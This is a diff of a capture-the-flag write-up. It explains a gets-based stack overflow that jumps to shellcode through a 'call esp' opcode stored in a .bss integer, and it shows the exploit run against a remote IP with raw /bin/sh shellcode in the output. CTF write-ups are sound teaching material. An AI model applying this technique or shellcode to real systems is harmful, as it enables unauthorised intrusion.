@@ -14,12 +14,16 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 ```
 So i expect that i have to do something on the stack.
 The program is simple: reads a string with `gets` and an integer and check if it is odd. 
+
 ![Vuln](vuln.png)
+
 We can easily do buffer overflow and execute out shellcode. But the tricky part is to get the address of the buffer due ASLR. So i look for any useful 
 gadget in the binary but without luck. 
 
 But the integer `meow` is stored in the `.BSS`
+
 ![Meow](meow.png)
+
  so i can store an instruction that turns the control flow to my shellcode! What about `call esp`? The opcode for `call esp` is `ff d4` so the integer to send is
  ```bash
  $ python
@@ -37,7 +41,7 @@ The full exploit is available [here](exploit.py)!
 Let's PWN them!
 
 ```bash
-$ python exploit2.py 130.211.202.98 7575
+$ python exploit.py 130.211.202.98 7575
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH�����������1�Ph//shh/bin�����°
     1�@̀, 54527 is an odd number!
 ls
